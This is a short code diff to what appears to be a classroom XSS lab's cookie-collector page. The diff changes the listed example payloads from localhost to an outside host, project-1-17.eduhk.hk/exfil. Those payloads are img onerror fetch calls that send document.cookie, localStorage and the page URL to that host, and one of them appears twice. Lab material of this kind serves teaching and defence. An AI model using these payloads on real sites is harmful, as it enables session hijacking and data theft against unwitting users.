@@ -248,16 +248,17 @@ app.get('/', (req, res) => {
       </div>
       <div class="card-body">
         <ol>
-          <li>Update XSS payloads to point to: <code>http://localhost:${PORT}/exfil</code></li>
+          <li>Update XSS payloads to point to: <code>https://project-1-17.eduhk.hk/exfil</code></li>
           <li>Post the payload in the vulnerable app's comment board</li>
           <li>When victims view the page, their data appears here automatically</li>
           <li>This page auto-refreshes every 3 seconds to show new victims</li>
         </ol>
         
         <div class="mt-3">
-          <strong class="text-warning">🎯 Example Payloads (for students to use):</strong>
-          <pre>&lt;img src=x onerror="fetch('http://localhost:${PORT}/exfil?data='+document.cookie)"&gt;</pre>
-          <pre>&lt;img src=x onerror="fetch('http://localhost:${PORT}/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,localStorage:JSON.stringify(localStorage),url:location.href})})"&gt;</pre>
+          <strong class="text-warning">🎯 Example Payloads :</strong>
+          <pre>&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil?data='+document.cookie)"&gt;</pre>
+          <pre>&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil?data='+document.cookie)"&gt;</pre>
+          <pre>&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,localStorage:JSON.stringify(localStorage),url:location.href})})"&gt;</pre>
         </div>
       </div>
     </div>
